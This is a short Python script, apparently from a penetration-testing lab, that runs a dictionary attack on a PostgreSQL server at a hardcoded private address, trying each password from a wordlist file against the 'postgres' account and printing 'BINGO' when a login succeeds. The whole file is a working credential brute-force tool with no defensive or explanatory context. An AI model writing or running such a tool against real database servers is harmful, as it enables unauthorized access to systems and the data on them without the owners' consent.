#!/usr/bin/python3.7
import pgdb
psqlconn = pgdb

fail = '\033[91m[-]\033[0m'
ok  = '\033[92m[+]\033[0m'
app  = '\033[92m[*]\033[0m'
att = '\033[93m[!]\033[0m'
green = '\033[92m'
nocolor= '\033[0m'
msg_ok=" BINGO - Username: "
msg_fail=" FAIL - Username: "
msg_pass=" Password: "
username="postgres"
wordlist="wordlist.txt"
target='10.171.1.129'
psql_server = ' - PostgreSQL Server IP: ' + target
psql_enum = att + " -  PostgreSQL version enumeration: \n" 
psql_generic = att + " - Generic information about the PostgreSQL connection: "

psql_start = app + " - Start PostgreSQL Dictonary Attack "
psql_end = app + " - PostgreSQL Dictonary Attack Finished"

print(psql_start)

with open(wordlist, "r") as _word:
    for _line in _word:
        _password = _line.strip("\n")

        try:
            psqlconn = pgdb.Connection(user = "postgres", password = _password, host = "10.171.1.129", port = "5432", database = "postgres")

            print(ok + msg_ok + green + username + nocolor + msg_pass + green + _password + nocolor + psql_server)
            
            psqlconn.close()

        except:
            print( fail + msg_fail + username + msg_pass + _password)

print(psql_end)
